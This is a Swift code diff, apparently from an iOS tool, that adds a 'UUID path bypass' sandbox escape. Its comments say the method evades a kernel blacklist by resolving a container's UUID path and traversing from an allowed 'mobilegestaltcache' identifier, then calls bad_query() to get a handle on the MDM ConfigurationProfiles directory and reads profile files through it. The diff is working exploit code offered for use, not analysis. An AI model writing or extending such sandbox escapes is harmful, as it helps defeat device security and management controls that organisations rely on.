@@ -642,12 +642,43 @@ struct ContentView: View {
             if sbxHandle >= 0 { sbxMethod = "bad_query" }
         }
 
+        // Method E: UUID path bypass (key technique for iOS 26.5+)
+        // The kernel blacklist checks for "configurationprofiles" in the path/identifier.
+        // We resolve the container to its UUID path (e.g. /.../<UUID>/Library/ConfigurationProfiles)
+        // which does NOT contain "configurationprofiles" in the SystemGroup directory name.
+        // Then we use mobilegestaltcache (allowed identifier) + path traversal to the UUID path.
+        var uuidMdmPath: String? = nil
+        if sbxHandle < 0 {
+            if let containerRoot = resolve_mdm_uuid_path() {
+                let uuidTarget = containerRoot.hasSuffix("/")
+                    ? containerRoot + "Library/ConfigurationProfiles/"
+                    : containerRoot + "/Library/ConfigurationProfiles/"
+                uuidMdmPath = uuidTarget
+                print("(mdm) trying UUID path bypass: \(uuidTarget)")
+
+                var uuid_c = uuidTarget.utf8CString.map { Int8($0) }
+                var mg_c = "systemgroup.com.apple.mobilegestaltcache".utf8CString.map { Int8($0) }
+                sbxHandle = bad_query(&uuid_c, false, &mg_c, true)
+                if sbxHandle >= 0 {
+                    sbxMethod = "bad_query-uuid"
+                    print("(mdm) ✓ UUID path bypass succeeded! handle=\(sbxHandle)")
+                } else {
+                    // Also try without explicit group (let bad_query use fallback logic)
+                    sbxHandle = bad_query(&uuid_c, false, nil, false)
+                    if sbxHandle >= 0 {
+                        sbxMethod = "bad_query-uuid-auto"
+                        print("(mdm) ✓ UUID path auto-detect succeeded! handle=\(sbxHandle)")
+                    }
+                }
+            }
+        }
+
         if sbxHandle < 0 {
             print("(mdm) all directory-level escapes failed (\(sbxHandle)), will try per-file methods")
         }
 
         defer {
-            if sbxHandle >= 0 && (sbxMethod == "bad_query" || sbxMethod == "bad_query-mg") {
+            if sbxHandle >= 0 && sbxMethod.hasPrefix("bad_query") {
                 bad_query_release(sbxHandle)
             }
         }
@@ -664,7 +695,14 @@ struct ContentView: View {
 
         for name in knownFiles {
             let fileURL  = targetDir.appendingPathComponent(name)
-            let filePath = fileURL.path
+            // If UUID bypass succeeded, use UUID-based path for file access
+            // (sandbox token covers UUID path, not the named symlink path)
+            let filePath: String
+            if let uuidDir = uuidMdmPath, sbxMethod.contains("uuid") {
+                filePath = uuidDir.hasSuffix("/") ? uuidDir + name : uuidDir + "/" + name
+            } else {
+                filePath = fileURL.path
+            }
             var handled  = false
 
             // ── Per-file sandbox_extension_issue_file ──────────────────────────
